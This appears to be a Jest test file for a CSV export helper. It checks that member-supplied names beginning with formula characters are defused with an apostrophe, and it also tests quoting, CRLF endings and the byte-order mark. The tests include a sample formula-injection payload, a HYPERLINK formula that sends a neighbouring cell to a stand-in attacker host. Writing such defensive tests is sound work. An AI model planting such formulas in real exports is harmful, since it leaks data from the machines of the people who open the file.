import { CSV_BOM, csvCell, csvRow } from '../export-csv';

/**
 * The CSV writer, and in particular the one thing it exists to stop.
 *
 * A member's display name goes into a file a member of staff opens in Excel. Excel does not read a
 * cell beginning `=`, `+`, `-` or `@` as text, so `=HYPERLINK("https://x/?"&A1,"Click")` typed into
 * a profile becomes a link that posts the row next to it to somebody else's server — from inside
 * the admin's own machine, with their network. Quoting is not the fix: the quotes are CSV syntax
 * and are gone before the formula is parsed. Each case below is written as the attack, not as the
 * character class, so the test keeps saying why.
 */
describe('CSV cells', () => {
  it.each([
    ['=HYPERLINK("https://evil.test/?"&A1)', '\'=HYPERLINK("https://evil.test/?"&A1)'],
    ['+1-555-0100', "'+1-555-0100"],
    ['-2+3', "'-2+3"],
    ['@SUM(A1:A9)', "'@SUM(A1:A9)"],
  ])('defuses %s', (name, expected) => {
    // The quoted form is what lands in the file; the apostrophe is what Excel reads as "text".
    expect(csvCell(name).replace(/^"|"$/g, '').replaceAll('""', '"')).toBe(expected);
  });

  it('defuses a tab and a carriage return, which are formula starts too', () => {
    expect(csvCell('\tnudge')).toBe("'\tnudge");
    expect(csvCell('\rnudge')).toBe('"\'\rnudge"');
  });

  it('leaves an ordinary name alone', () => {
    expect(csvCell('Amara Okafor')).toBe('Amara Okafor');
  });

  it('quotes a cell with a comma, a quote or a newline — and doubles the quotes', () => {
    expect(csvCell('Okafor, Amara')).toBe('"Okafor, Amara"');
    expect(csvCell('say "hello"')).toBe('"say ""hello"""');
    expect(csvCell('two\nlines')).toBe('"two\nlines"');
  });

  it('quotes a defused cell that also needs quoting, so the apostrophe survives', () => {
    expect(csvCell('=A1,B1')).toBe('"\'=A1,B1"');
  });

  it.each([
    [null, ''],
    [undefined, ''],
    ['', ''],
  ])('writes %p as an empty cell rather than the word', (value, expected) => {
    expect(csvCell(value)).toBe(expected);
  });

  it('writes a date as an ISO instant, which is what every other admin payload uses', () => {
    expect(csvCell(new Date('2026-10-11T09:30:00.000Z'))).toBe('2026-10-11T09:30:00.000Z');
  });

  it('writes a boolean as a word and a number as a number', () => {
    expect(csvCell(true)).toBe('true');
    expect(csvCell(false)).toBe('false');
    expect(csvCell(0)).toBe('0');
  });

  it('joins a list rather than printing [object Object]', () => {
    expect(csvCell(['SPAM', 'HARASSMENT'])).toBe('SPAM HARASSMENT');
  });

  it('is not fooled by a formula inside a list', () => {
    expect(csvCell(['=A1'])).toBe("'=A1");
  });
});

describe('CSV rows', () => {
  it('ends with CRLF, as RFC 4180 and Excel both expect', () => {
    expect(csvRow(['a', 'b'])).toBe('a,b\r\n');
  });

  it('keeps empty cells positional, so a short row cannot shift a column', () => {
    expect(csvRow(['a', null, 'c'])).toBe('a,,c\r\n');
  });

  it('starts the file with a byte-order mark, or Excel mangles every accented name', () => {
    expect(CSV_BOM).toBe('﻿');
    expect(Buffer.from(CSV_BOM, 'utf8')).toEqual(Buffer.from([0xef, 0xbb, 0xbf]));
  });
});
